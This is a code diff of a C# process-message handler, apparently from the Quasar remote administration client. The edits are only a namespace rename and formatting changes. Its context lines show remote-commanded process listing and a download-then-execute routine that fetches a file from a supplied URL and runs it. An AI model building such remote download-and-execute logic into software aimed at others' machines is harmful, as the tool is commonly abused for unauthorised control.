@@ -11,7 +11,7 @@ using System.Diagnostics;
 using System.Net;
 using System.Threading;
 
-namespace Quasar.Client.Messages
+namespace Quasar.Client.MessageHandlers
 {
     /// <summary>
     /// Handles messages for the interaction with tasks.
@@ -63,10 +63,10 @@ namespace Quasar.Client.Messages
 
         private void Execute(ISender client, GetProcesses message)
         {
-            Process[] pList = Process.GetProcesses();
+            var pList = Process.GetProcesses();
             var processes = new Common.Models.Process[pList.Length];
 
-            for (int i = 0; i < pList.Length; i++)
+            for (var i = 0; i < pList.Length; i++)
             {
                 var process = new Common.Models.Process
                 {
@@ -87,7 +87,7 @@ namespace Quasar.Client.Messages
                 // download and then execute
                 if (string.IsNullOrEmpty(message.DownloadUrl))
                 {
-                    client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = false});
+                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                     return;
                 }
 
@@ -108,7 +108,7 @@ namespace Quasar.Client.Messages
                 }
                 catch
                 {
-                    client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = false});
+                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                     NativeMethods.DeleteFile(message.FilePath);
                 }
             }
@@ -121,7 +121,7 @@ namespace Quasar.Client.Messages
 
         private void OnDownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
         {
-            var message = (DoProcessStart) e.UserState;
+            var message = (DoProcessStart)e.UserState;
             if (e.Cancelled)
             {
                 NativeMethods.DeleteFile(message.FilePath);
@@ -152,7 +152,7 @@ namespace Quasar.Client.Messages
             {
                 try
                 {
-                    ProcessStartInfo startInfo = new ProcessStartInfo
+                    var startInfo = new ProcessStartInfo
                     {
                         UseShellExecute = true,
                         FileName = filePath
